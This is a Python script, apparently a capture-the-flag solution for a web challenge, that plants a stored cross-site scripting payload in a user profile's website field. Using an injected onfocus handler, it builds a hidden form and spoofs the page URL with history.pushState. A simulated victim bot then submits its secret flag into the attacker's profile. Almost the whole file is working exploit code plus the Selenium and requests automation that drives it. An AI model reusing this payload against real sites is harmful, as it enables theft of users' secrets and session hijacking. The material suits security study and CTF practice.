from selenium import webdriver
import requests
import os

FLAG = os.getenv("FLAG", "firebird{B0ku_no_YAkl7OrI_CHaN}")  # default is fake flag as expected

# SITE_URL = "http://localhost"
SITE_URL = "http://chal.firebird.sh:35030"

# style=display:block;position:fixed;top:35;left:145;z-index:-999;width:200px;height:100px;
PAYLOAD_JAVASCRIPT = f"""
quot=String.fromCharCode(34);
singlequot=String.fromCharCode(39);

fieldset=document.createElement('fieldset');

form=document.createElement('form');
form.action='/profile';
form.method='post';

p=document.createElement('p');

input1=document.createElement('input');
input1.name='website';

input2=document.createElement('input');
input2.type='hidden';
input2.name='id';
input2.value='1';

input3=document.createElement('input');
input3.type='submit';

p.appendChild(input1);
p.appendChild(input2);
p.appendChild(input3);

form.appendChild(p);
fieldset.appendChild(form);

document.getElementsByTagName('body')[0].appendChild(fieldset);

document.getElementsByTagName('a')[2].href='javascript:window.history.pushState(null,null,'+singlequot+'/challenge'+singlequot+')';
"""
PAYLOAD_JAVASCRIPT = PAYLOAD_JAVASCRIPT.replace("\n", "").replace(" ", "")

PAYLOAD = f"""
javascript:void(0) autofocus onfocus={PAYLOAD_JAVASCRIPT}
"""

PAYLOAD = PAYLOAD.replace("\n", "")
print(f"Payload: {PAYLOAD}")


def submit(sess):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)
    driver.implicitly_wait(3)

    driver.get(SITE_URL + "/login")
    driver.add_cookie({"name": "session", "value": sess})
    driver.find_element("xpath", "(//input)[1]").send_keys("Black Bauhinia")
    driver.find_element("xpath", "(//input)[2]").send_keys("BL@ckB6a")  # Nobody cares about the password
    driver.find_element("xpath", "(//input)[3]").click()

    print(driver.current_url, flush=True)

    flag = False
    if (driver.current_url == SITE_URL + "/"):
        print("Logged in, clicking element...", flush=True)
        # print(f"Page contents: {driver.page_source}", flush=True)
        driver.find_element("xpath", "(//a)[3]").click()
        print(driver.current_url, flush=True)
        # we can trick this with window.history.pushState(null,null,'/challenge')
        if (driver.current_url == SITE_URL + "/challenge"):
            flag = True
            driver.find_element("xpath", "//fieldset[1]//input[1]").send_keys(FLAG)
            driver.find_element("xpath", "//fieldset[1]//input[3]").click()

    print(driver.current_url, flush=True)  # TODO: check whether the flag is accepted

    driver.get(SITE_URL + "/logout")
    for cookie in driver.get_cookies():
        if cookie["name"] == "session" and cookie["httpOnly"] == True:
            sess = cookie["value"]
            break

    driver.quit()
    return sess, flag


def check_profile_links(session):
    # Check value of profile links
    res = session.get(SITE_URL + "/")
    b6a_profile_link = res.text.split("<tr><td>1<td>")[1].split("<td>")[0]
    print(f"Black Bauhinia profile link: {b6a_profile_link}", flush=True)
    firebird_profile_link = res.text.split("<tr><td>2<td>")[1].split("<td>")[0]
    print(f"Firebird profile link: {firebird_profile_link}", flush=True)


def main():
    # Open requests session
    with requests.Session() as session:
        # Login
        login_res = session.post(SITE_URL + "/login", data={"user": "Firebird", "pass": "F!reb1rd"},
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if login_res.status_code == 200 or login_res.status_code == 302:
            print("Login successful!", flush=True)
            print(f"Session: {session.cookies.get_dict()['session']}", flush=True)
        else:
            print("Login failed!", flush=True)
            print(login_res.status_code)
            print(login_res.text)
            return

        # Add payload to profile
        payload_res = session.post(SITE_URL + "/profile", data={"website": PAYLOAD},
                                   headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if payload_res.status_code == 200:
            print(f"Payload added! Payload token:", flush=True)
            print(session.cookies.get_dict()['session'], flush=True)
        else:
            print("Payload failed!", flush=True)
            return

        check_profile_links(session)

        # Submit
        sess, flag = submit(session.cookies.get_dict()["session"])

        if flag:
            print("Flag accepted!", flush=True)
        else:
            print("Flag rejected!", flush=True)

        print(f"Session: {sess}", flush=True)

        check_profile_links(session)


if __name__ == "__main__":
    main()
